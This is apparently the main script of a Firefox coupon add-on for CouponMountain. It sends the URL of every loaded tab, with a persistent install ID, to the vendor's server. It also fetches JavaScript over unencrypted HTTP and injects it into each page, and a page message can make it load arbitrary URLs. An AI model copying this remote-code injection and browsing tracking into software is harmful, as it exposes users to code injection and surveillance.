var self = require("self")
	,tabs = require('tabs')
	,Request = require("sdk/request").Request
	,ss = require('sdk/simple-storage')
	,prefs = require("sdk/simple-prefs")
	,pageWorker = require("sdk/page-worker")
	,uuid = require('sdk/util/uuid').uuid()
	;

exports.main = function() {
	var SITE 		= 'http://www.couponmountain.com'
		,FILE_SITE	= 'http://files.couponmountain.com'
		,FILE_JS 	= FILE_SITE + "/js/default/chrome/default_v3.1.js"
		,FILE_CSS 	= FILE_SITE + "/css/default/chrome/default_v3.1.css"
		,INIT		= SITE + "/plugin/init.html"
		,COUPON		= SITE + "/plugin/getCoupon.html"
		,USE_INFO	= SITE + "/plugin/adduseinfo.html"

		,APPLY_MAX_TIME	= 300
		,APPLY_MIN_TIME	= 100
		;

	var CmusMain = {

		log: function(){
			if(!prefs.prefs['log'])
				return;
			var s = [];
			function ots(o,i){
				var _s = []
					,_t = Object.prototype.toString.call(o)
					,i = i || 1
					,_n = new Array(i+1)
					,_c = '    '
					;

				if(_t !== '[object Array]' && _t !== '[object Function]' && _t !== '[object Object]')
					return o;
				
				for(var k in o) 
					_s.push(_n.join(_c) + k + ': ' + ots(o[k], i+1));
				_s = _s.join(', \n');

				if(_s){
					_n.shift();
					_s = '\n' + _s + '\n' + _n.join(_c);
				}

				return _t === '[object Array]' ?  '[' + _s + ']' :  '{' + _s +'}';
			}
			for(var k in arguments) s.push(ots(arguments[k]));
		    console.log(s.join(' '));
		},
	
		setStorage: function(key,value){
			ss.storage[key]=value;
		},

		getStorage: function(key){
			return ss.storage[key] !== undefined ? ss.storage[key] : false;	
		},
	
		pageWorker: function(url){
			var t = this;
			t.log('[PW URL]:', url);
			if(url && url.indexOf('http') !==0)
				return;
			pageWorker.Page({contentURL: url});
		},

		urlRequest: function(obj,cb){
			var t = this;
			t.log('[UR URL]:', obj.url);
			if(obj.url && obj.url.indexOf('http') !==0)
				return;
			var d = {
				url:obj.url+(!obj.cache ? "" : (obj.url.indexOf("?") > -1 ? '&' : '?') + "_=" + new Date().getTime()),
				onComplete:function(res){
					t.log('[UR ONCOMPLETE]:',obj.url , res.status);
					if(typeof cb !== 'function')
						return;
					var rs = '';
					if(res.status == 200)
						rs = obj.dataType === 'text' ? res.text : res.json;
					cb(rs);
				}
			};
			
			if(obj.data)
				d.content = obj.data;
			else
				d.content = {};

			d.content.version = self.version;
			d.content.uuid = uuid.toString().replace(/[\{\}]/g,'');

			Request(d).post();	
		},	

		convertToSec: function(num) {
			num	= parseInt(num);
			if (Number.isNaN(num)) {
				num	= 0;
			} else {
				num *= 1000;
			}
			return num;
		},

		setOption: function(){
			prefs.on("", function(prefName){
				var v = prefs.prefs[prefName];
				switch(prefName){
					case "maxExecTime":
						if(v < APPLY_MIN_TIME)
							prefs.prefs[prefName] = APPLY_MIN_TIME;
						break;
					default:
						break;
				}
			});
		},	

		getFile: function(url,key){
			var t = this;
			t.urlRequest({url:url,dataType:'text',cache:true}, function(response) {
				t.setStorage(key,response);
			});
		},

		getCoupon: function(data,cb){
			this.urlRequest({
				url:COUPON,
				data:data 
			}, cb);
		},

		getInit: function(){
			var t = this;
			t.urlRequest({url:INIT}, function(response) {
				t.setStorage('cssReqTime',t.convertToSec(response.cssReqTime));
				t.setStorage('initReqTime',t.convertToSec(response.initReqTime));
				t.setStorage('jsReqTime',t.convertToSec(response.jsReqTime));
				t.setStorage('pushReqTime',t.convertToSec(response.pushReqTime));
			});
		},

		onMessage: function(worker,data){
			var t = this
				,ret={ret:0}
				;
			switch (data.reqType) {
					case "storeApplyInfo":
						t.setStorage('curApplyInfo',data.info)
						worker.port.emit("onMessage",ret);
						break;
					case "getApplyInfo":
						ret = t.getStorage('curApplyInfo');
						worker.port.emit("onMessage",ret);
						break;
					case "logUseInfo":
						t.urlRequest({
							url:USE_INFO,
							data:{useinfo: data.info}
						},function(res){
							worker.port.emit("onMessage",res);
						});
						break;
					case "openLink":
						tabs.open(data.tagUrl);
						break;
					case "callIframe":
						t.pageWorker(data.callUrl);
					default:
						break;
				}
		},

		run: function(){
			var t = this;
			t.log('[WINDOW]:','Running...');
			t.getFile(FILE_JS,'js');
			t.getFile(FILE_CSS,'css');
			t.getInit();
			//t.setOption();
			
			tabs.on('ready', function(tab) {
				t.log('[TAB]:', 'Reading');	
				var jsCode = t.getStorage('js') || ''
				,cssCode = t.getStorage('css') || ''
				;

				if(!jsCode || !cssCode){
					t.log('[JS CSS]:', 'Js or css load error!');
					return;
				}

				t.getCoupon({url: tab.url, referType:2}, function(res){	
					if(!res || !res.count){
						t.log('[GET COUPON]:', 'No coupon!');
						return;
					}
					//res.maxExecTime = prefs.prefs.maxExecTime;
					//res.codeTime = prefs.prefs.codeTime;

					var worker = tab.attach({
						contentScriptFile: [self.data.url("js/jquery.js"), self.data.url("js/mix.js"), self.data.url("js/const.js"),self.data.url("js/ga.js")],
						contentScript:
							"$('<style>').appendTo('head').html('"+cssCode.replace(/[\r\n]/g,' ').replace("'","\\'")+"');"+jsCode
					});

					t.log('[COUPON INFO]:', res);

					worker.port.emit("onGetCoupon", res);
					worker.port.on("onMessage",function(data){								
						t.onMessage(worker,data);
					});
				});

			});
		}
	}

	CmusMain.run();
}
